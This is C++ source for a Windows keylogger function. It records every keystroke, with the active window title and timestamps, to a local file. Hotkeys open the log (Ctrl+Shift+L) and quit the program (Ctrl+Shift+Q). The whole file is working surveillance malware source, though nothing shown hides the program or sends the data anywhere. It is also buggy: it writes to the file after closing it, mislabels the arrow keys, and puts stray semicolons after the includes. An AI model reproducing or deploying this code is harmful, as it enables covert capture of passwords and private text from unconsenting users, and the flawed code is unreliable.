#include "keylogger.h";
#include <iostream>;

void keylogger(int keyAscii, char* filename)
{
	// Window Handle
	HWND hwnd = GetForegroundWindow();

	FILE* OUTPUT_FILE;
	OUTPUT_FILE = fopen(filename, "a+");
	GetWindowText(hwnd, currWindow, sizeof(currWindow));
	
	// Checks if the previous & current window are the same
	if (strcmp(currWindow, prevWindow) != 0)
	{
		time_t currentTime = time(NULL);
		char* deltaTime = ctime(&currentTime);
		fprintf(OUTPUT_FILE, "\n\n%s\t\t%s", currWindow, deltaTime);
		fclose(OUTPUT_FILE);
		strcpy(prevWindow, currWindow);
	}

    // Key commands
    if (GetAsyncKeyState(VK_CONTROL) & 0x8000 && GetAsyncKeyState(VK_SHIFT) & 0x8000 && GetAsyncKeyState('L') & 0x8000)
    {
        ShellExecute(0, "open", "log.csv", 0, 0, SW_SHOW);
    }
    if (GetAsyncKeyState(VK_CONTROL) & 0x8000 && GetAsyncKeyState(VK_SHIFT) & 0x8000 && GetAsyncKeyState('Q') & 0x8000)
    {
        exit(0);
    }

	// Log keys
	Sleep(100);
    if (keyAscii == VK_SHIFT)
    {
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    }
    else if (keyAscii == VK_RETURN)
    {
        fprintf(OUTPUT_FILE, "%s", "[RETURN]");
    }
    else if (keyAscii == VK_BACK)
    {
        fprintf(OUTPUT_FILE, "%s", "[BACK SPACE]");
    }
    else if (keyAscii == VK_LBUTTON)
    {
        fprintf(OUTPUT_FILE, "%s", "[LButton]");
    }
    else if (keyAscii == VK_ESCAPE)
    {
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
    }
    else if (keyAscii == VK_CONTROL)
    {
        fprintf(OUTPUT_FILE, "%s", "[CTRL]");
    }
    else if (keyAscii == VK_CAPITAL)
    {
        fprintf(OUTPUT_FILE, "%s", "[CAPS_LOCK]");
    }
    else if (keyAscii == VK_MENU)
    {
        fprintf(OUTPUT_FILE, "%s", "[ALT]");
    }
    else if (keyAscii == VK_TAB)
    {
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
    }
    else if (keyAscii == VK_LEFT)
    {
        fprintf(OUTPUT_FILE, "%s", "[LEFT_ARROW]");
    }
    else if (keyAscii == VK_RIGHT)
    {
        fprintf(OUTPUT_FILE, "%s", "[LEFT_RIGHT]");
    }
    else if (keyAscii == VK_UP)
    {
        fprintf(OUTPUT_FILE, "%s", "[LEFT_UP]");
    }
    else if (keyAscii == VK_DOWN)
    {
        fprintf(OUTPUT_FILE, "%s", "[LEFT_DOWN]");
    }
    else if (keyAscii == VK_SPACE)
    {
        fprintf(OUTPUT_FILE, "%s", "[SPACE_KEY]");
    }
    else
    {
        fprintf(OUTPUT_FILE, "%c", static_cast<char>(keyAscii));
    }
    fclose(OUTPUT_FILE);
}